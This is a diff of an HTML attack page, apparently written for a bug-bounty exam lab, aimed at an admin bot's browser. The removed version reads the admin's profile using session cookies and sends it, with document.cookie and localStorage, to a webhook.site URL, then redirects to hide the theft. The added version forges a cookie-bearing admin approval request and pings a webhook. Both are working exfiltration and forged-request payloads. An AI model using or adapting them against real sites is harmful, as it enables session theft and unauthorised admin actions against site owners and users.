@@ -1,57 +1,16 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Processing...</title>
-</head>
-<body>
-    <h2>Loading Rental Details...</h2>
-    <p>Please wait while we redirect you to the admin dashboard.</p>
-
+<html>
+  <body>
+    <h1>Processing Review...</h1>
     <script>
-        (async function() {
-            // 1. The URL where you want to send the stolen data
-            const exfilUrl = "https://webhook.site/f44cd6ae-a8f9-4f79-ab4d-19fc5550d8a8L";
-            
-            // 2. The Target API endpoint
-            const targetApi = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
-
-            try {
-                // 3. Fetch the Admin's sensitive profile data using their cookies
-                const response = await fetch(targetApi, {
-                    method: 'GET',
-                    credentials: 'include' // This is the key! It sends the Admin's session cookies
-                });
-                
-                const data = await response.json();
-
-                // 4. Send the data (which likely contains the flag) to your webhook
-                await fetch(exfilUrl, {
-                    method: 'POST',
-                    mode: 'no-cors', // Prevents CORS errors on the exfiltration step
-                    body: JSON.stringify({
-                        status: "Success",
-                        location: window.location.href,
-                        adminData: data,
-                        cookies: document.cookie,
-                        localStorage: JSON.stringify(localStorage)
-                    })
-                });
-
-            } catch (error) {
-                // If the fetch fails, log the error to your webhook so you can debug
-                fetch(exfilUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ status: "Error", message: error.message })
-                });
-            }
-
-            // 5. Optional: Redirect the admin after 2 seconds to look "normal"
-            setTimeout(() => {
-                window.location.href = "https://api-bugbounty-exam.hashacademy.co/dashboard";
-            }, 2000);
-        })();
+      // This script runs in the Admin Bot's browser
+      fetch('https://api-bugbounty-exam.hashacademy.co/api/admin/cars/69dd69884e3edba5f08f60f9/approve', {
+        method: 'PUT',
+        credentials: 'include' // This ensures the Admin's cookies are sent
+      })
+      .then(response => {
+        // Optional: Send a confirmation to yourself that the bot triggered it
+        fetch('https://webhook.site/bd2deb0f-4b44-46ed-9533-ddaa9746dc19');
+      });
     </script>
-</body>
+  </body>
 </html>
